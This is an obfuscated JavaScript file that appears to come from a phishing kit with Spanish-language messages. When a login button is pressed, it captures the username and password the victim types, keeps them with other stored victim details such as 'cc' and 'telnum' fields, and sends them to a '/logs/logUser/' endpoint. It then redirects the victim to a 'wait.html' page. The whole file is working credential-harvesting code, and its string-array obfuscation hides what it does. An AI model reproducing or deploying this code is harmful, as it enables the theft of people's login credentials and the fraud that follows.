const _0x33604a = _0xbe7b;
(function (_0xad3a32, _0x5f111e) {
  const _0xd8293b = _0xbe7b,
    _0x719f4a = _0xad3a32();
  while (!![]) {
    try {
      const _0x3bdd12 =
        -parseInt(_0xd8293b(0x1a6)) / 0x1 +
        -parseInt(_0xd8293b(0x19b)) / 0x2 +
        (-parseInt(_0xd8293b(0x1a4)) / 0x3) *
          (-parseInt(_0xd8293b(0x1ab)) / 0x4) +
        parseInt(_0xd8293b(0x19a)) / 0x5 +
        (-parseInt(_0xd8293b(0x189)) / 0x6) *
          (parseInt(_0xd8293b(0x192)) / 0x7) +
        (-parseInt(_0xd8293b(0x198)) / 0x8) *
          (-parseInt(_0xd8293b(0x1a3)) / 0x9) +
        (parseInt(_0xd8293b(0x188)) / 0xa) * (parseInt(_0xd8293b(0x1a1)) / 0xb);
      if (_0x3bdd12 === _0x5f111e) break;
      else _0x719f4a["push"](_0x719f4a["shift"]());
    } catch (_0x4d2aef) {
      _0x719f4a["push"](_0x719f4a["shift"]());
    }
  }
})(_0x5e14, 0x40490);
function updateLS() {
  const _0x3e59a2 = _0xbe7b;
  LS[_0x3e59a2(0x18f)]("info", JSON[_0x3e59a2(0x199)](info));
}
const button = document[_0x33604a(0x1a5)](_0x33604a(0x1ae)),
  userInput = document[_0x33604a(0x1a5)](_0x33604a(0x185)),
  passInput = document[_0x33604a(0x1a5)](_0x33604a(0x186));
function _0x5e14() {
  const _0x49f991 = [
    "telnum",
    "/logs/logUser/",
    "btnUsuario",
    "focus",
    "metaInfo",
    "Usuario\x20no\x20encontrado\x20en\x20la\x20base\x20de\x20datos",
    "txtUsuario",
    "txtPass",
    "puser",
    "8180LJhODn",
    "24XOIlrc",
    "/logs/logs",
    "reg",
    "Usuario\x20encontrado",
    "Error\x20al\x20actualizar\x20el\x20usuario",
    "Usuario\x20actualizado",
    "setItem",
    "href",
    "idreg",
    "226989ivrqKu",
    "value",
    "application/json",
    "Corrigió\x20Usuario",
    "json",
    "preventDefault",
    "8REVoRF",
    "stringify",
    "1655090TKxCBe",
    "459448HaTwPT",
    "Error\x20al\x20procesar\x20la\x20solicitud:",
    "location",
    "log",
    "error",
    "click",
    "2629jiesaV",
    "disabled",
    "882792qAwvbV",
    "398367oHgmMu",
    "getElementById",
    "134653HVVqPX",
    "PUT",
    "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor",
    "addEventListener",
    "GET",
    "4ACgyQM",
  ];
  _0x5e14 = function () {
    return _0x49f991;
  };
  return _0x5e14();
}
function _0xbe7b(_0x3e85ad, _0x55535b) {
  const _0x5e1412 = _0x5e14();
  return (
    (_0xbe7b = function (_0xbe7b92, _0x121f5e) {
      _0xbe7b92 = _0xbe7b92 - 0x182;
      let _0x333f3e = _0x5e1412[_0xbe7b92];
      return _0x333f3e;
    }),
    _0xbe7b(_0x3e85ad, _0x55535b)
  );
}
async function updateStatus() {
  const _0x20a418 = _0x33604a;
  button[_0x20a418(0x1a2)] = !![];
  try {
    const _0x203350 = await fetch(url + _0x20a418(0x18a), {
      method: _0x20a418(0x1aa),
      headers: { "Content-Type": "application/json" },
    });
    if (!_0x203350["ok"]) throw new Error(_0x20a418(0x1a8));
    const _0x4544bb = await _0x203350[_0x20a418(0x196)](),
      _0x2b094e = [..._0x4544bb],
      _0x1f989f = _0x2b094e["find"](
        (_0x46a52b) =>
          _0x46a52b[_0x20a418(0x18b)] == info[_0x20a418(0x183)]["cc"] &&
          _0x46a52b["cl"] == info[_0x20a418(0x183)][_0x20a418(0x1ac)]
      );
    if (_0x1f989f) {
      console["log"](_0x20a418(0x18c));
      const _0x98e489 = await fetch(
        url + _0x20a418(0x1ad) + _0x1f989f[_0x20a418(0x191)],
        {
          method: _0x20a418(0x1a7),
          headers: { "Content-Type": _0x20a418(0x194) },
          body: JSON[_0x20a418(0x199)]({
            us: info["metaInfo"]["user"],
            ps: info[_0x20a418(0x183)][_0x20a418(0x187)],
            status: _0x20a418(0x195),
          }),
        }
      );
      if (!_0x98e489["ok"]) throw new Error(_0x20a418(0x18d));
      const _0x4882d2 = await _0x98e489[_0x20a418(0x196)]();
      console[_0x20a418(0x19e)](_0x20a418(0x18e));
    } else console[_0x20a418(0x19f)](_0x20a418(0x184));
  } catch (_0x2c74ec) {
    console[_0x20a418(0x19f)](_0x20a418(0x19c), _0x2c74ec);
  } finally {
    (button["disabled"] = ![]),
      (window[_0x20a418(0x19d)][_0x20a418(0x190)] = "wait.html");
  }
}
button[_0x33604a(0x1a9)](_0x33604a(0x1a0), async function (_0x44637b) {
  const _0x40e785 = _0x33604a;
  _0x44637b[_0x40e785(0x197)]();
  if (userInput["value"] === "" || passInput["value"] === "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x40e785(0x182)]();
    return;
  }
  const _0x241a79 = userInput[_0x40e785(0x193)],
    _0x5439b0 = passInput[_0x40e785(0x193)];
  (info[_0x40e785(0x183)]["user"] = _0x241a79),
    (info[_0x40e785(0x183)]["puser"] = _0x5439b0),
    updateLS(),
    await updateStatus();
});
